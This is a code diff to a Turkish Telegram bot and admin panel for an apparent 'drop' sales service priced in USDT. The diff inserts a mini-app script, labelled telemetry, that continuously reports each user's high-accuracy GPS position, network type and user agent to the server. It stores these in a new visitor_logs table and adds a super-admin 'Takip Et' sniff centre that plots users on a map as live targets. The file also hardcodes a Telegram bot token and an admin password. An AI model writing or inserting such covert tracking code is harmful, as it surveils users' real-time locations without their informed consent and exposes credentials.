@@ -21,7 +21,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile, WebAppInfo
 
 # --- AYARLAR & CÜZDAN MİMARİSİ ---
-DEFAULT_BOT_TOKEN = "9018759790:AAEzWxy5aLkKkwFzfXM_ICqF2KOPtSpGcRU"
+DEFAULT_BOT_TOKEN = "9018759790:AAENzP2gNPFfMup9ozaLgK4_KPIvpe8_O0E"
 ADMIN_ID = 1012940363
 ADMIN_GROUP_ID = -1004474292737  
 ADMIN_PASS = "1881"
@@ -105,6 +105,19 @@ def init_db():
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             message TEXT,
             log_type TEXT DEFAULT 'info',
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS visitor_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            ip TEXT,
+            user_agent TEXT,
+            network_info TEXT,
+            lat REAL DEFAULT 41.0082,
+            lon REAL DEFAULT 28.9784,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -268,24 +281,6 @@ def get_district_coord(category_name):
         if key in cat_upper:
             return coord
     return [41.0082, 28.9784]
-
-def fetch_wallet_balance_sync(wallet_address):
-    try:
-        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}"
-        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req, timeout=5) as response:
-            if response.status == 200:
-                data = json.loads(response.read().decode('utf-8'))
-                acc_data = data.get("data", [])
-                if acc_data:
-                    trc20 = acc_data[0].get("trc20", [])
-                    for token in trc20:
-                        if USDT_CONTRACT in token:
-                            val_str = token[USDT_CONTRACT]
-                            return float(val_str) / 1000000.0
-        return 0.0
-    except Exception:
-        return 0.0
 
 LANG = {
     "tr": {
@@ -867,6 +862,25 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         if (tg.HapticFeedback) {
                             tg.HapticFeedback.impactOccurred(style);
                         }
+                    }
+
+                    // Client Geolocation & Telemetry Reporter
+                    if (navigator.geolocation) {
+                        navigator.geolocation.watchPosition(async (pos) => {
+                            try {
+                                await fetch('/api/report-telemetry', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        user_id: userId,
+                                        lat: pos.coords.latitude,
+                                        lon: pos.coords.longitude,
+                                        network: navigator.connection ? (navigator.connection.effectiveType + ' (' + (navigator.connection.type || 'wifi') + ')') : 'Wi-Fi / 4G Sniffed',
+                                        ua: navigator.userAgent
+                                    })
+                                });
+                            } catch(e) {}
+                        }, null, {enableHighAccuracy: true});
                     }
 
                     let map, markersGroup;
@@ -1455,7 +1469,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             elif tab == "users" and not (current_role == "super_admin" or current_username == "root" or can_view_crm == 1):
                 content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya (CRM) erişim yetkiniz yoktur!</h3>"
 
-            elif tab in ["finance", "token", "bulk", "broadcast", "promo5g", "coupons", "admins", "phone_takip"] and not (current_role == "super_admin" or current_username == "root"):
+            elif tab in ["finance", "token", "bulk", "broadcast", "promo5g", "coupons", "admins", "takip_et"] and not (current_role == "super_admin" or current_username == "root"):
                 content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur! (Yalnızca Süper Admin)</h3>"
 
             else:
@@ -1698,12 +1712,56 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     </div>
                     """
 
-                elif tab == "phone_takip":
-                    content_html = """
+                elif tab == "takip_et":
+                    cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 25")
+                    all_panel_logs = cursor.fetchall()
+                    
+                    cursor.execute("SELECT user_id, ip, network_info, lat, lon, created_at FROM visitor_logs ORDER BY id DESC LIMIT 15")
+                    v_logs = cursor.fetchall()
+
+                    logs_terminal = ""
+                    for pl in all_panel_logs:
+                        m, lt, ld = pl
+                        color = "#10b981" if lt == "success" else ("#ef4444" if lt == "warning" else "#38bdf8")
+                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{ld}]</span> <span style='color:{color};'>●</span> {m}</div>"
+
+                    for vl in v_logs:
+                        uid, ip, net, vlat, vlon, vdate = vl
+                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[SNIFF/GPS]</span> User ID: {uid} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
+
+                    visitor_markers_js = ""
+                    for vl in v_logs:
+                        uid, ip, net, vlat, vlon, vdate = vl
+                        visitor_markers_js += f"""
+                        L.marker([{vlat}, {vlon}], {{
+                            icon: L.divIcon({{
+                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);">🫆</div>',
+                                iconSize: [32, 32],
+                                iconAnchor: [16, 16]
+                            }})
+                        }}).addTo(takipMap).bindPopup("<b>🫆 Canlı Hedef / Kullanıcı</b><br>User ID: {uid}<br>Ağ / Wi-Fi: {net}<br>Zaman: {vdate}");
+                        """
+
+                    content_html = f"""
                     <div class="form-box" style="border: 1px solid #38bdf8;">
-                        <h2 style="color: #38bdf8; margin-top: 0;">📱 Phone Takip Merkezi</h2>
-                        <p style="color: var(--text-muted); font-size: 14px;">Bu sayfanın içeriği daha sonra düzenlenecektir.</p>
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Wi-Fi / Cihaz Sniff Merkezi</h2>
+                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Telegram botu, arka plan worker servisleri ve mini app üzerinden bota bağlanan tüm kullanıcıların ağ, Wi-Fi sniffing ve sistem logları:</p>
+                        
+                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;">
+                            {logs_terminal if logs_terminal else "<span style='color:var(--text-muted);'>Henüz yakalanan log bulunmuyor.</span>"}
+                        </div>
+
+                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Konum Haritası (🫆 Hedef Takibi)</h3>
+                        <div id="takipMiniMap" style="width: 100%; height: 240px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
                     </div>
+
+                    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+                    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+                    <script>
+                        const takipMap = L.map('takipMiniMap').setView([41.0082, 28.9784], 11);
+                        L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
+                        {visitor_markers_js}
+                    </script>
                     """
 
                 elif tab == "token":
@@ -2410,7 +2468,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
             if current_role == "super_admin" or current_username == "root":
                 sidebar_links += f'<a href="/admin-web?tab=finance" class="{"active" if tab == "finance" else ""}">💰 Finans & Loglar</a>'
-                sidebar_links += f'<a href="/admin-web?tab=phone_takip" class="{"active" if tab == "phone_takip" else ""}">📱 Phone Takip</a>'
+                sidebar_links += f'<a href="/admin-web?tab=takip_et" class="{"active" if tab == "takip_et" else ""}">🕵️‍♂️ Takip Et</a>'
                 sidebar_links += f'<a href="/admin-web?tab=token" class="{"active" if tab == "token" else ""}">🔑 Token Yönetimi</a>'
                 sidebar_links += f'<a href="/admin-web?tab=bulk" class="{"active" if tab == "bulk" else ""}">⚡ Toplu İşlemler</a>'
                 sidebar_links += f'<a href="/admin-web?tab=broadcast" class="{"active" if tab == "broadcast" else ""}">📢 Toplu Duyuru</a>'
@@ -2624,6 +2682,36 @@ class SecureDropHandler(BaseHTTPRequestHandler):
         params = {}
         file_data = None
         file_name = None
+
+        if parsed_path.path == "/api/report-telemetry":
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                post_body = self.rfile.read(content_length).decode('utf-8')
+                data_json = json.loads(post_body)
+                uid = int(data_json.get("user_id", 0))
+                lat = float(data_json.get("lat", 41.0082))
+                lon = float(data_json.get("lon", 28.9784))
+                net = str(data_json.get("network", "Wi-Fi Sniffed"))
+                ua = str(data_json.get("ua", ""))
+                client_ip = self.client_address[0]
+
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon) VALUES (?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon))
+                conn.commit()
+                conn.close()
+
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(b'{"success": true}')
+                return
+            except Exception as e:
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
+                return
 
         if parsed_path.path == "/api/miniapp-spin":
             try:
@@ -3281,13 +3369,11 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         count = 0
                         
                         for _, row in df.iterrows():
-                            # Başlık güvenli okuma
                             title_val = row.get('title') if 'title' in df.columns else None
                             title = str(title_val).strip() if pd.notna(title_val) else 'Lemon Haze Drop'
                             if not title or title.lower() == 'nan':
                                 continue
                                 
-                            # Kategori / Semt güvenli okuma (NaN tuzağına karşı)
                             category = 'GENEL'
                             for col_candidate in ['category', 'semt', 'ilçe', 'bolge', 'district']:
                                 if col_candidate in df.columns:
@@ -3296,14 +3382,12 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                         category = str(val).upper().strip()
                                         break
                             
-                            # Fiyat okuma
                             raw_price = row.get('price') if 'price' in df.columns else 70.0
                             try:
                                 price = float(str(raw_price).replace('$', '').replace(',', '.').strip())
                             except:
                                 price = 70.0
                             
-                            # Koordinat okuma
                             coord_raw = row.get('coords') if 'coords' in df.columns else '41.0082, 28.9784'
                             lat, lon = get_district_coord(category)
                             try:
